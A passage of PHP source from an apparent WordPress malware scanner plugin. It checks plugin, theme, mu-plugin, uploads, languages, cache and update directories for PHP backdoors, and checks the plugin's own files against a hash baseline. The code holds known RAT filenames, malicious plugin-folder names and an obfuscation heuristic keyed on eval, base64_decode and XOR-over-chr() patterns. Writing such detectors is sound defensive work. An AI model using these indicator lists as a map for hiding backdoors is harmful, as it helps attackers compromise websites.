			'check_first_party_integrity' => [ __CLASS__, 'check_first_party_integrity' ], // 1.4.11: operator-declared plugins are exempt from the checksum report but watched for in-place edits
			'check' => [ 'WPS_Dropin_Guard', 'check' ], // 1.3.71: temporal drop-in guard  creation/modification/removal vs clean baseline
		];

		$findings = [];
		$skipped  = [];
		// 1.4.46: published so the long-running checks can test it themselves.
		$GLOBALS['wps_scan_started'] = $budget_start;
		self::start_deadline();
		foreach ( $checks as $label => $cb ) {
			if ( self::out_of_time() ) {
				$skipped[] = $label;
				continue;
			}
			$findings = array_merge( $findings, (array) call_user_func( $cb ) );
		}

		if ( $skipped ) {
			$findings[] = [
				'severity' => 'medium',
				'type'     => 'scan_budget_exhausted (partial scan)',
				'subject'  => count( $skipped ) . ' of ' . count( $checks ) . ' checks skipped',
				'path'     => '',
				'action'   => 'The scan hit its ' . round( self::scan_budget_seconds() ) . 's time budget and skipped: '
					. implode( ', ', $skipped ) . '. Findings above are real but the scan is not complete. '
					. 'Run a manual scan from the Overview tab when the site is quieter; skipped checks run then.',
			];
			WPS_Logger::log_event( 'scan_budget_exhausted', count( $skipped ) . ' checks skipped: ' . implode( ',', $skipped ) );
		}

		// Auto-delete confirmed malware that is safe to remove when enabled.
		// Theme files and WP core files are never touched.
		if ( self::auto_delete_enabled() ) {
			self::auto_remediate( $findings );
		} else {
			self::mark_auto_delete_disabled( $findings );
		}
		if ( class_exists( 'WPS_Quarantine' ) ) {
			WPS_Quarantine::purge_expired(); // 1.3.94: retention cleanup on the hourly scan
		}

		// 1.4.42: collapse duplicates for display.
		//
		// Deliberately AFTER auto_remediate(). A re-drop kit puts the same file
		// in a dozen directories, and the remediator has to see all twelve to
		// remove all twelve - grouping first would leave eleven copies on disk
		// and report the job done.
		$findings = self::group_duplicate_findings( $findings );

		// 1.4.47: the normalisation cache is scan-scoped; let it go.
		if ( class_exists( 'WPS_Utils' ) ) {
			WPS_Utils::clear_normalised_cache();
		}

		set_transient( 'wps_scan_results', $findings, HOUR_IN_SECONDS );
		update_option( 'wps_last_scan', [
			'time'    => gmdate( 'Y-m-d H:i:s' ) . ' UTC',
			'count'   => count( $findings ),
			'partial' => ! empty( $skipped ),
			'skipped' => count( $skipped ),
		] );

		if ( $findings ) {
			WPS_Logger::log_event( 'scan_issues', count( $findings ) . ' issue(s) found' );
			// Notify admin once per hour for critical findings so cron scans
			// are surfaced by email without flooding the inbox.
			$critical = array_filter( $findings, fn( $f ) => ( $f['severity'] ?? '' ) === 'critical' );
			if ( $critical ) {
				$sample = reset( $critical );
				WPS_Logger::notify_admin(
					count( $critical ) . ' critical security issue(s) found',
					( $sample['type'] ?? 'Unknown' ) . ': ' . ( $sample['subject'] ?? '' )
					. '  ' . count( $findings ) . ' total finding(s)'
				);
			}
		} else {
			WPS_Logger::log_event( 'scan_clean', 'No issues found' );
		}

		return $findings;
	}

	//  Individual checks 

	/** @return array<int, array<string, string>> */
	private static function check_plugin_folders(): array {
		$found = [];
		if ( ! is_dir( WP_PLUGIN_DIR ) ) {
			return $found;
		}
		$dirs = glob( WP_PLUGIN_DIR . '/*', GLOB_ONLYDIR );
		if ( ! is_array( $dirs ) ) {
			return $found;
		}
		foreach ( $dirs as $dir ) {
			$folder = basename( $dir );
			$is_malware = false;
			$family     = '';

			if ( WPS_Blocker::is_blocked( $folder . '/' . $folder . '.php' ) ) {
				$is_malware = true;
				$family     = 'wp-perf-analytics family';
			}
			foreach ( [ 'antymalwary', 'wpconsole', 'wp-performance-booster' ] as $bad ) {
				if ( strpos( strtolower( $folder ), $bad ) !== false ) {
					$is_malware = true;
					$family     = 'WP-antymalwary-bot family';
				}
			}

			if ( ! $is_malware ) continue;

			// Detect .htaccess false-security: operator placed an .htaccess
			// thinking it blocks the malware. Apache's .htaccess controls HTTP
			// access only  WordPress loads plugins via PHP require_once
			// internally, which completely bypasses Apache. The malware keeps
			// running. The folder must be deleted, not just web-blocked.
			$htaccess_note = '';
			if ( file_exists( $dir . '/.htaccess' ) ) {
				$htaccess_note = ' NOTE: .htaccess found in this folder. '
					. '.htaccess blocks HTTP access but does NOT prevent WordPress '
					. 'from loading plugin PHP files via require_once. '
					. 'The malware is still executing on every page load. '
					. 'The folder must be physically deleted.';
			}

			$found[] = [
				'severity'    => 'critical',
				'type'        => 'Malicious plugin folder on disk (' . $family . ')',
				'subject'     => $folder,
				'path'        => $dir,
				'action'      => 'Delete via SSH: rm -rf ' . $dir . $htaccess_note,
				'auto_delete' => true,
				'delete_path' => $dir,
			];
		}
		return $found;
	}

	/**
	 * 1.4.0: self-baseline integrity (Hardening II). At install or upgrade -
	 * detected by a version change - the plugin records a sha256 of every one
	 * of its own php/js/css files (trust-on-first-use: the release you upload
	 * is the trusted state). Every scan then diffs the live tree against that
	 * baseline and reports modified, missing, or unexpected files. Distinct
	 * from the 1.3.89 integrity check, which verifies OTHER plugins against
	 * wordpress.org; this one has no external dependency and covers the one
	 * plugin wordpress.org cannot vouch for - this custom build itself.
	 *
	 * Review-only: the plugin never deletes its own files. The logs/ runtime
	 * directory (chain key + anchor mirrors, event file) is excluded - it is
	 * mutable by design and its own integrity is the HMAC chain's job.
	 */
	private static function self_file_hashes(): array {
		$hashes = [];
		if ( ! defined( 'WPS_DIR' ) || ! is_dir( WPS_DIR ) ) {
			return $hashes;
		}
		$root = rtrim( str_replace( '\\', '/', (string) realpath( WPS_DIR ) ), '/' );
		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( WPS_DIR, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			foreach ( $iter as $f ) {
				if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) continue;
				$ext = strtolower( $f->getExtension() );
				// 1.4.2: .md joins the baseline. The Docs tab now renders these
				// files in the admin, so a tampered doc is an admin-XSS attempt
				// as well as a documentation lie. The viewer contains it
				// (markdown safe mode + wp_kses_post); this reports it.
				if ( ! in_array( $ext, [ 'php', 'js', 'css', 'md' ], true ) ) continue;
				$norm = str_replace( '\\', '/', $f->getPathname() );
				$rel  = ltrim( substr( $norm, strlen( $root ) ), '/' );
				if ( strpos( $rel, 'logs/' ) === 0 ) continue; // runtime dir, mutable by design
				$h = @hash_file( 'sha256', $f->getPathname() );
				if ( $h ) $hashes[ $rel ] = $h;
			}
		} catch ( \Exception $e ) {}
		ksort( $hashes );
		return $hashes;
	}

	private static function establish_self_baseline(): void {
		update_option( 'wps_self_baseline', [
			'version'      => WPS_VERSION,
			'generated_at' => gmdate( 'Y-m-d H:i:s' ) . ' UTC',
			'hashes'       => self::self_file_hashes(),
		], false );
	}

	/** @return array<int, array<string, string>> */
	private static function check_self_integrity(): array {
		$found    = [];
		$baseline = get_option( 'wps_self_baseline', null );
		if ( ! is_array( $baseline ) || ( $baseline['version'] ?? '' ) !== WPS_VERSION || empty( $baseline['hashes'] ) ) {
			// First run on this version: the freshly-uploaded release is the
			// trusted state. Record it and start diffing from the next scan.
			self::establish_self_baseline();
			return $found;
		}

		$live     = self::self_file_hashes();
		$expected = (array) $baseline['hashes'];

		foreach ( $expected as $rel => $hash ) {
			if ( ! isset( $live[ $rel ] ) ) {
				$found[] = [
					'severity' => 'critical',
					'type'     => 'WP Perf Shield file missing (self-integrity)',
					'subject'  => $rel,
					'path'     => WPS_DIR . $rel,
					'action'   => 'A file belonging to WP Perf Shield has been deleted since the ' . esc_html( (string) $baseline['generated_at'] ) . ' baseline. An attacker disabling the security plugin is the classic first move - re-upload the ' . WPS_VERSION . ' release and investigate who had file access.',
				];
			} elseif ( ! hash_equals( (string) $hash, (string) $live[ $rel ] ) ) {
				$found[] = [
					'severity' => 'critical',
					'type'     => 'WP Perf Shield file modified (self-integrity)',
					'subject'  => $rel,
					'path'     => WPS_DIR . $rel,
					'action'   => 'This file no longer matches the sha256 recorded at the ' . esc_html( (string) $baseline['generated_at'] ) . ' baseline for ' . WPS_VERSION . '. If you did not edit it yourself, treat it as tampering with the security layer: re-upload the release and diff the live file first to see what was changed. Reported for review - the plugin never deletes its own files.',
				];
			}
		}
		foreach ( $live as $rel => $hash ) {
			if ( ! isset( $expected[ $rel ] ) ) {
				$found[] = [
					'severity' => 'critical',
					'type'     => 'Unexpected file inside WP Perf Shield (self-integrity)',
					'subject'  => $rel,
					'path'     => WPS_DIR . $rel,
					'action'   => 'This file is not part of the ' . WPS_VERSION . ' release. Malware hiding inside the security plugin\'s own folder inherits its trust - review the file and remove it if you did not put it there.',
				];
			}
		}

		if ( $found && class_exists( 'WPS_Event_Log' ) ) {
			WPS_Event_Log::audit( 'self_integrity_failed', [
				'object_type' => 'plugin',
				'object_name' => 'wp-perf-shield',
				'original'    => 'baseline ' . (string) $baseline['generated_at'],
				'new'         => count( $found ) . ' deviation(s)',
				'reason'      => 'live plugin tree no longer matches the recorded release baseline',
				'severity'    => 'critical',
				'risk'        => 100,
			] );
		}
		return $found;
	}

	/**
	 * True when the file carries a PHP-executable extension. Uses the same
	 * PHP_INVENTORY_EXTS set the inventory/drift system uses, so every content
	 * walker agrees on what counts as "a PHP file" (phtml, php3-php7, pht, phar
	 * included). Closes the gap where a payload dropped as e.g. shell.phtml
	 * slipped past walkers that only tested for a literal '.php' extension.
	 *
	 * @param SplFileInfo|DirectoryIterator $file
	 */
	private static function is_php_executable( $file ): bool {
		return in_array( strtolower( $file->getExtension() ), self::PHP_INVENTORY_EXTS, true );
	}

	/** @return array<int, array<string, string>> */
	private static function check_php_signatures(): array {
		$found    = [];
		$self_dir = realpath( WPS_DIR );
		$all_sigs = array_merge( self::SIGNATURES_PERF, self::SIGNATURES_ANTY, self::SIGNATURES_BACKDOOR );

		if ( ! is_dir( WP_PLUGIN_DIR ) ) {
			return $found;
		}
		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( WP_PLUGIN_DIR, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			foreach ( $iter as $file ) {
				if ( ! ( $file instanceof SplFileInfo ) ) continue;
				if ( ! self::is_php_executable( $file ) || ! $file->isReadable() ) continue;
				$real = realpath( $file->getPathname() );
				if ( $self_dir && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;

				$contents = @file_get_contents( $file->getPathname() );
				if ( $contents === false ) continue;

				// Whitelist short-circuit: skip files with verified-clean SHA-256.
				if ( self::is_whitelisted( $contents ) ) continue;

				foreach ( $all_sigs as $sig ) {
					if ( strpos( $contents, $sig ) !== false ) {
						// Path-signature whitelist: suppress if this exact (path, sig)
						// pair is verified clean. Other signatures still scan normally.
						if ( self::is_whitelisted_match( $file->getPathname(), $sig ) ) continue;
						$family = self::sig_family( $sig );
						$found[] = [
							'severity'    => 'critical',
							'type'        => 'Malware signature in PHP file (' . $family . ')',
							'subject'     => $file->getFilename(),
							'path'        => $file->getPathname(),
							'action'      => 'Delete file and parent folder immediately',
							'match'       => $sig,
							'auto_delete' => true,
							'delete_path' => self::get_plugin_folder( $file->getPathname() ),
						];
						break;
					}
				}
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'Scanner error: ' . $e->getMessage() );
		}

		// 1.3.97: signatures previously covered plugins only. A shell parked in an
		// INACTIVE theme evaded both this walk and check_theme_for_backdoor (which
		// only reads the active/parent theme). Walk every theme so a dormant theme
		// is not a signature blind spot. delete_path is the specific theme folder.
		$themes_root = defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR . '/themes' : '';
		if ( $themes_root !== '' && is_dir( $themes_root ) ) {
			$themes_real = rtrim( str_replace( '\\', '/', (string) realpath( $themes_root ) ), '/' );
			try {
				$titer = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $themes_root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $titer as $file ) {
					if ( ! ( $file instanceof SplFileInfo ) ) continue;
					if ( ! self::is_php_executable( $file ) || ! $file->isReadable() ) continue;
					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $file->getPathname() ) ) continue;

					$contents = @file_get_contents( $file->getPathname() );
					if ( $contents === false ) continue;
					if ( self::is_whitelisted( $contents ) ) continue;

					foreach ( $all_sigs as $sig ) {
						if ( strpos( $contents, $sig ) !== false ) {
							if ( self::is_whitelisted_match( $file->getPathname(), $sig ) ) continue;

							// Theme folder = themes_root/<first path segment>.
							$norm = str_replace( '\\', '/', $file->getPathname() );
							$rest = ltrim( substr( $norm, strlen( $themes_real ) ), '/' );
							$seg  = explode( '/', $rest )[0];
							$theme_dir = $seg !== '' ? $themes_real . '/' . $seg : dirname( $norm );

							$family = self::sig_family( $sig );
							$found[] = [
								'severity'    => 'critical',
								'type'        => 'Malware signature in theme file (' . $family . ')',
								'subject'     => $seg . '/' . basename( $norm ),
								'path'        => $file->getPathname(),
								'action'      => 'Delete the infected file. If this is not a theme you recognise or use, remove the whole theme folder.',
								'match'       => $sig,
								'auto_delete' => true,
								'delete_path' => $theme_dir,
							];
							break;
						}
					}
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'Scanner error (themes): ' . $e->getMessage() );
			}
		}

		return $found;
	}

	/**
	 * NEW: Scan the active theme directory for the RAT disguised as a theme file.
	 * The confirmed variant uses the header "Theme Compatibility Layer" and the
	 * filename class-wp-compat.php, placed inside the active (or parent) theme.
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_theme_for_backdoor(): array {
		$found = [];
		$dirs  = array_unique( array_filter( [
			get_template_directory(),
			get_stylesheet_directory(),
		] ) );

		$all_sigs = array_merge( self::SIGNATURES_BACKDOOR, self::SIGNATURES_PERF );
		// Known RAT filenames when placed inside theme dirs
		$rat_filenames = [
			'class-wp-compat.php',
			'class-wp-compat-v2.php',
			'wp-compat-helper.php',
		];

		foreach ( $dirs as $theme_dir ) {
			if ( ! is_dir( $theme_dir ) ) continue;
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $theme_dir, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $file ) {
					if ( ! ( $file instanceof SplFileInfo ) ) continue;
					if ( ! self::is_php_executable( $file ) || ! $file->isReadable() ) continue;

					$contents = @file_get_contents( $file->getPathname() );
					if ( ! $contents ) continue;

					// Flag by known RAT filename immediately
					if ( in_array( $file->getFilename(), $rat_filenames, true ) ) {
						$found[] = [
							'severity'    => 'critical',
							'type'        => 'Known RAT filename in theme directory (PHP backdoor)',
							'subject'     => $file->getFilename(),
							'path'        => $file->getPathname(),
							'action'      => 'Delete immediately  this is not a legitimate theme file',
							'auto_delete' => true,
							'delete_path' => $file->getPathname(),
						];
						continue;
					}

					// Whitelist short-circuit: skip files with verified-clean SHA-256.
					if ( self::is_whitelisted( $contents ) ) continue;

					// Also flag by signature
					foreach ( $all_sigs as $sig ) {
						if ( strpos( $contents, $sig ) !== false ) {
							// Path-signature whitelist: suppress this (path, sig) pair only.
							if ( self::is_whitelisted_match( $file->getPathname(), $sig ) ) continue;
							$found[] = [
								'severity'    => 'critical',
								'type'        => 'Malware signature in theme file (' . self::sig_family( $sig ) . ')',
								'subject'     => str_replace( $theme_dir . '/', '', $file->getPathname() ),
								'path'        => $file->getPathname(),
								'action'      => 'Review and delete file  theme files should never contain RAT signatures',
								'match'       => $sig,
								// Do NOT auto_delete theme files  too risky
							];
							break;
						}
					}
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'Theme scan error: ' . $e->getMessage() );
			}
		}
		return $found;
	}

	/**
	 * NEW: Check mu-plugins for the restored RAT.
	 * Mode 'r' of the RAT reads wp_session_tokens_config from DB and writes it
	 * to wp-content/mu-plugins/session-manager.php. MU plugins load automatically
	 * on every request without appearing in the plugin list.
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_mu_plugins(): array {
		$found   = [];
		$mu_dir  = WP_CONTENT_DIR . '/mu-plugins';
		if ( ! is_dir( $mu_dir ) ) {
			return $found;
		}

		$known_rat_mu_files = [
			'session-manager.php',
		];
		$all_sigs = array_merge( self::SIGNATURES_BACKDOOR, self::SIGNATURES_PERF );

		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $mu_dir, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			foreach ( $iter as $file ) {
				if ( ! ( $file instanceof SplFileInfo ) || ! self::is_php_executable( $file ) ) continue;

				// Flag known RAT MU filenames immediately
				if ( in_array( $file->getFilename(), $known_rat_mu_files, true ) ) {
					$found[] = [
						'severity'    => 'critical',
						'type'        => 'Known RAT MU plugin restored to mu-plugins directory',
						'subject'     => $file->getFilename(),
						'path'        => $file->getPathname(),
						'action'      => 'Delete immediately AND delete wp_session_tokens_config DB option to prevent re-restoration',
						'auto_delete' => true,
						'delete_path' => $file->getPathname(),
					];
					continue;
				}

				// Scan contents of any unknown MU plugin for signatures
				if ( ! $file->isReadable() ) continue;
				$contents = @file_get_contents( $file->getPathname() );
				if ( ! $contents ) continue;

				// Whitelist short-circuit: skip files with verified-clean SHA-256.
				if ( self::is_whitelisted( $contents ) ) continue;

				$before_sig = count( $found );

				foreach ( $all_sigs as $sig ) {
					if ( strpos( $contents, $sig ) !== false ) {
						// Path-signature whitelist: suppress this (path, sig) pair only.
						if ( self::is_whitelisted_match( $file->getPathname(), $sig ) ) continue;
						$found[] = [
							'severity'    => 'critical',
							'type'        => 'Malware signature in mu-plugin file (' . self::sig_family( $sig ) . ')',
							'subject'     => $file->getFilename(),
							'path'        => $file->getPathname(),
							'action'      => 'Delete immediately and also delete the wp_session_tokens_config DB option',
							'match'       => $sig,
							'auto_delete' => true,
							'delete_path' => $file->getPathname(),
						];
						break;
					}
				}

				// 1.3.82: structural obfuscation heuristic for renamed MU-plugin
				// RATs that evade the known-filename and cleartext-signature checks
				// above. The campaign's payload deobfuscates itself with a rolling
				// XOR-over-chr() guard; that idiom is effectively unique to it, so
				// it gates auto-deletion to keep false positives off legitimate
				// (rarely obfuscated) MU plugins.
				if ( count( $found ) === $before_sig ) {
					$ob_cues = 0;
					$ob_why  = [];
					$xor_guard = (bool) preg_match( '/chr\(\s*\$\w+\[\s*\$\w+\s*\]\s*\^\s*ord\(/', $contents );
					if ( $xor_guard ) { $ob_cues += 2; $ob_why[] = 'rolling-xor deobfuscation guard'; }
					if ( strpos( $contents, 'eval(' ) !== false ) { $ob_cues++; $ob_why[] = 'eval'; }
					if ( strpos( $contents, 'base64_decode' ) !== false ) { $ob_cues++; $ob_why[] = 'base64_decode'; }
					if ( substr_count( $contents, 'chr(' ) >= 50 ) { $ob_cues++; $ob_why[] = 'high chr() density'; }
					if ( strpos( $contents, 'register_shutdown_function' ) !== false ) { $ob_cues++; $ob_why[] = 'register_shutdown_function'; }

					if ( $xor_guard && $ob_cues >= 4 ) {
						$found[] = [
							'severity'    => 'critical',
							'type'        => 'Obfuscated MU plugin (structural RAT-payload shape)',
							'subject'     => $file->getFilename(),
							'path'        => $file->getPathname(),
							'action'      => 'Delete this MU plugin. It is a heavily obfuscated payload in the auto-loading mu-plugins directory. Also check the wp-content drop-ins (db.php, advanced-cache.php, object-cache.php, sunrise.php) for a re-dropper that restores it.',
							'match'       => implode( ', ', $ob_why ),
							'auto_delete' => true,
							'delete_path' => $file->getPathname(),
						];
					}
				}
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'MU plugin scan error: ' . $e->getMessage() );
		}
		return $found;
	}

	/** @return array<int, array<string, string>> */
	private static function check_uploads_for_php(): array {
		$found      = [];
		$upload_dir = wp_upload_dir();
		$base       = $upload_dir['basedir'] ?? '';
		if ( ! $base || ! is_dir( $base ) ) {
			return $found;
		}
		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $base, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			foreach ( $iter as $file ) {
				if ( ! ( $file instanceof SplFileInfo ) ) continue;
				if ( ! self::is_php_executable( $file ) ) continue;
				if ( self::is_harmless_upload_index_stub( $file ) ) continue;

				$contents  = $file->isReadable() ? @file_get_contents( $file->getPathname(), false, null, 0, 262144 ) : false;
				$match     = '';
				$confirmed = false;
				if ( is_string( $contents ) && $contents !== '' && ! self::is_whitelisted( $contents ) ) {
					foreach ( array_merge( self::SIGNATURES_PERF, self::SIGNATURES_ANTY, self::SIGNATURES_BACKDOOR ) as $sig ) {
						if ( strpos( $contents, $sig ) !== false ) {
							$match     = $sig;
							$confirmed = true;
							break;
						}
					}
				}

				if ( $confirmed ) {
					$found[] = [
						'severity'    => 'critical',
						'type'        => 'Confirmed malware PHP file in uploads directory',
						'subject'     => $file->getFilename(),
						'path'        => $file->getPathname(),
						'action'      => 'Known malware signature found inside uploads. Auto-delete is safe for this confirmed executable payload.',
						'match'       => $match,
						'auto_delete' => true,
						'delete_path' => $file->getPathname(),
					];
				} else {
					$found[] = [
						'severity'    => 'high',
						'type'        => 'PHP file in uploads directory (review required)',
						'subject'     => $file->getFilename(),
						'path'        => $file->getPathname(),
						'action'      => 'PHP in uploads is suspicious, but no known malware signature was confirmed. Review contents before deleting. Harmless small index.php silence stubs are ignored.',
						'delete_path' => $file->getPathname(),
					];
				}
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'Uploads scan error: ' . $e->getMessage() );
		}
		return $found;
	}

	private static function is_harmless_upload_index_stub( SplFileInfo $file ): bool {
		if ( strtolower( $file->getFilename() ) !== 'index.php' ) {
			return false;
		}
		if ( $file->getSize() > 128 || ! $file->isReadable() ) {
			return false;
		}

		$contents = @file_get_contents( $file->getPathname(), false, null, 0, 256 );
		if ( ! is_string( $contents ) ) {
			return false;
		}

		$contents = trim( str_replace( [ "\r\n", "\r" ], "\n", $contents ) );
		return (bool) preg_match( '/^<\?php\s*(?:(?:\/\/|#)\s*)?Silence is golden\.?\s*(?:\?>)?$/i', $contents );
	}

	/**
	 * Scan wp-content/languages/ for PHP backdoors.
	 *
	 * WordPress language packs should contain translation data files such as
	 * .mo, .po, .l10n.php, or .json. The confirmed wp-locale-handler.php RAT
	 * was packaged as languages.zip and can be dropped into wp-content/languages
	 * where it looks like a localization artefact but exposes the _wph backdoor
	 * modes and restores mu-plugins/session-manager.php from the database.
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_languages_for_php(): array {
		$found     = [];
		$lang_dir  = WP_CONTENT_DIR . '/languages';
		if ( ! is_dir( $lang_dir ) ) {
			return $found;
		}

		$known_rat_filenames = [
			'wp-locale-handler.php',
		];
		$all_sigs = array_merge( self::SIGNATURES_BACKDOOR, self::SIGNATURES_PERF, self::SIGNATURES_ANTY );

		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $lang_dir, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			foreach ( $iter as $file ) {
				if ( ! ( $file instanceof SplFileInfo ) || ! self::is_php_executable( $file ) ) continue;

				$is_known_filename = in_array( $file->getFilename(), $known_rat_filenames, true );
				$is_allowed_l10n    = substr( $file->getFilename(), -9 ) === '.l10n.php';
				$is_blank_index     = $file->getFilename() === 'index.php' && $file->getSize() <= 30;
				$contents = $file->isReadable() ? @file_get_contents( $file->getPathname() ) : '';
				$matched = '';
				if ( is_string( $contents ) && $contents !== '' ) {
					foreach ( $all_sigs as $sig ) {
						if ( strpos( $contents, $sig ) !== false ) {
							$matched = $sig;
							break;
						}
					}
				}

				if ( $is_known_filename || $matched !== '' ) {
					$found[] = [
						'severity'    => 'critical',
						'type'        => 'PHP backdoor in wp-content/languages',
						'subject'     => $file->getFilename(),
						'path'        => $file->getPathname(),
						'action'      => 'Delete immediately. WordPress language directories should not contain this executable backdoor.',
						'match'       => $matched !== '' ? $matched : $file->getFilename(),
						'auto_delete' => true,
						'delete_path' => $file->getPathname(),
					];
					continue;
				}

				if ( $is_allowed_l10n || $is_blank_index ) {
					continue;
				}

				$found[] = [
					'severity'    => 'high',
					'type'        => 'Unexpected PHP file in wp-content/languages',
					'subject'     => $file->getFilename(),
					'path'        => $file->getPathname(),
					'action'      => 'Review and delete if not intentionally placed. Normal WordPress language packs contain only .mo/.po/.l10n.php/.json files, never arbitrary PHP. Backdoors here commonly camouflage themselves with the filename of an installed plugin (for example wordpress-seo.php, sitepress-multilingual-cms.php, or a bricks-components-<random>.php variant); a name matching one of your plugins is not evidence the file is legitimate.',
					'delete_path' => $file->getPathname(),
				];
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'Languages scan error: ' . $e->getMessage() );
		}

		return $found;
	}

	/**
	 * Scan WordPress-managed writable directories that should never hold
	 * standalone PHP (added 1.3.74).
	 *
	 * Predicted from the ddbricks.com report: the dropper stages camouflaged
	 * PHP in writable WP-managed directories (it used uploads/ and languages/).
	 * uploads/, languages/, and cache/ already have location-based checks, but
	 * three equivalent writable directories did not:
	 *
	 *   - fonts/  (the Font Library directory, WordPress 6.5+). It holds only
	 *     uploaded font files. A PHP file here is never legitimate, so this is
	 *     the highest-confidence gap and is the natural next staging spot.
	 *   - upgrade/ and upgrade-temp-backup/  (update staging). These hold
	 *     extracted update packages and rollback copies only transiently while
	 *     an update runs; PHP sitting here at rest is suspect. Because a live
	 *     update legitimately places plugin/theme PHP here, these are flagged at
	 *     medium with an update-in-progress caveat and are never auto-deleted.
	 *
	 * A signature match in any of them is auto-deleted (malware signatures do
	 * not appear in legitimate font or update files); otherwise the file gets a
	 * review-and-delete finding with a delete button.
	 *
	 * @return array<int, array<string, mixed>>
	 */
	private static function check_writable_dirs_for_php(): array {
		$found = [];

		$targets = [
			'fonts'               => [ 'severity' => 'high',   'caveat' => '' ],
			'upgrade'             => [ 'severity' => 'medium', 'caveat' => ' If a plugin, theme, or core update is in progress this directory may briefly hold extracted update files; confirm no update is running before deleting.' ],
			'upgrade-temp-backup' => [ 'severity' => 'medium', 'caveat' => ' WordPress stages rollback copies here during an update, which legitimately include plugin and theme PHP; confirm no update is running before deleting.' ],
		];
		$all_sigs = array_merge( self::SIGNATURES_BACKDOOR, self::SIGNATURES_PERF, self::SIGNATURES_ANTY );

		foreach ( $targets as $sub => $meta ) {
			$dir = WP_CONTENT_DIR . '/' . $sub;
			if ( ! is_dir( $dir ) ) {
				continue;
			}
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $dir, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $file ) {
					if ( ! ( $file instanceof SplFileInfo ) || ! self::is_php_executable( $file ) ) {
						continue;
					}
					$name = $file->getFilename();
					if ( $name === 'index.php' && $file->getSize() <= 30 ) {
						continue; // silence-is-golden stub
					}
					$contents = $file->isReadable() ? @file_get_contents( $file->getPathname() ) : '';
					$matched  = '';
					if ( is_string( $contents ) && $contents !== '' ) {
						foreach ( $all_sigs as $sig ) {
							if ( strpos( $contents, $sig ) !== false ) {
								$matched = $sig;
								break;
							}
						}
					}

					if ( $matched !== '' ) {
						$found[] = [
							'severity'    => 'critical',
							'type'        => 'PHP backdoor in wp-content/' . $sub,
							'subject'     => $name,
							'path'        => $file->getPathname(),
							'action'      => 'Delete immediately. wp-content/' . $sub . '/ must never contain an executable PHP backdoor.',
							'match'       => $matched,
							'auto_delete' => true,
							'delete_path' => $file->getPathname(),
						];
						continue;
					}

					$found[] = [
						'severity'    => $meta['severity'],
						'type'        => 'Unexpected PHP file in wp-content/' . $sub,
						'subject'     => $name,
						'path'        => $file->getPathname(),
						'action'      => 'wp-content/' . $sub . '/ is a WordPress-managed directory that does not normally contain standalone PHP. This matches the campaign pattern of staging camouflaged PHP in writable directories. Review and delete if you did not place it.' . $meta['caveat'],
						'delete_path' => $file->getPathname(),
					];
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'Writable-dir scan error (' . $sub . '): ' . $e->getMessage() );
			}
		}

		return $found;
	}

	/**
	 * Scan wp-content/cache/ for PHP files (added v1.2.1).
	 *
	 * Cache directories written by WP-Optimize, W3 Total Cache, WP Super Cache,
	 * and similar plugins contain only HTML, JS, CSS, and gz files  never
	 * executable PHP. The only legitimate exception is blank index.php files
	 * ( 10 bytes) dropped by WordPress or cache plugins to prevent directory
	 * listing; anything larger is not a normal cache artefact.
	 *
	 * Confirmed real-world placement: object-cache-handler.php (RAT v1.7)
	 * was found in wp-content/cache/ disguised as "Object Cache Handler".
	 *
	 * Scan strategy:
	 *   1. Known RAT filenames  critical, auto-delete.
	 *   2. Any other PHP file over 10 bytes  signature scan + flag as
	 *      high severity if any signature matches, medium if no match
	 *      (warrants manual review regardless).
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_cache_dir_for_php(): array {
		$found     = [];
		$cache_dir = WP_CONTENT_DIR . '/cache';
		if ( ! is_dir( $cache_dir ) ) {
			return $found;
		}

		$known_rat_filenames = array_merge(
			[ 'object-cache-handler.php' ],
			WPS_Indicators::secondary_backdoor_filenames()
		);

		$all_sigs = array_merge( self::SIGNATURES_PERF, self::SIGNATURES_ANTY, self::SIGNATURES_BACKDOOR );

		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $cache_dir, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			foreach ( $iter as $file ) {
				if ( ! ( $file instanceof SplFileInfo ) ) continue;
				if ( ! self::is_php_executable( $file ) || ! $file->isReadable() ) continue;

				// Blank index.php files ( 10 bytes) are legitimate directory
				// listing protection  skip them.
				if ( $file->getSize() <= 10 ) continue;

				// Known RAT filenames: flag immediately without signature check.
